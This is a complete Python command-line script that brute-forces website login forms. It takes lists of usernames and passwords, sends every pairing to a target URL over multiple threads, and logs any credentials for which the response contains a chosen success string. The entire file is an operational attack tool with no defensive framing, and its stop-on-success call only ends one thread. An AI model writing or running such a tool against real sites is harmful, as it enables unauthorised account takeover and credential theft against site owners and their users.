import requests
import sys
import random
import threading
import time
import argparse
import logging

# Set up command-line arguments
parser = argparse.ArgumentParser(description="Website Login Brute-Force Script")
parser.add_argument("--target", required=True, help="URL of the target website's login form")
parser.add_argument("--usernames", required=True, help="Path to the file containing usernames")
parser.add_argument("--passwords", required=True, help="Path to the file containing passwords")
parser.add_argument("--needle", required=True, help="Message indicating successful login")
parser.add_argument("--threads", type=int, default=1, help="Number of concurrent threads")
args = parser.parse_args()

# Set up logging
logging.basicConfig(level=logging.INFO, format="[%(asctime)s] [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

def try_login(username, password):
    try:
        logger.info(f"Trying user:{username} password:{password}")
        response = requests.post(args.target, data={"username": username, "password": password}, timeout=10)
        if args.needle.encode() in response.content:
            logger.info(f"Valid password '{password}' found for user '{username}'!")
            sys.exit()
    except requests.exceptions.RequestException as e:
        logger.error(f"Error while trying user:{username} password:{password}: {e}")

def main():
    try:
        with open(args.usernames, "r") as usernames_file:
            usernames = [line.strip() for line in usernames_file.readlines()]

        with open(args.passwords, "r") as passwords_file:
            passwords = [line.strip() for line in passwords_file.readlines()]

        logger.info("Starting brute-force attack...")

        # Shuffle usernames and passwords for randomization
        random.shuffle(usernames)
        random.shuffle(passwords)

        threads = []

        for username in usernames:
            for password in passwords:
                thread = threading.Thread(target=try_login, args=(username, password))
                threads.append(thread)
                thread.start()

                # Limit concurrent threads
                while len(threads) >= args.threads:
                    for t in threads:
                        if not t.is_alive():
                            threads.remove(t)
                    time.sleep(0.1)

        # Wait for all threads to finish
        for thread in threads:
            thread.join()

        logger.info("Brute-force attack completed. No valid password found.")

    except FileNotFoundError as e:
        logger.error(f"File not found: {e.filename}")

if __name__ == "__main__":
    main()
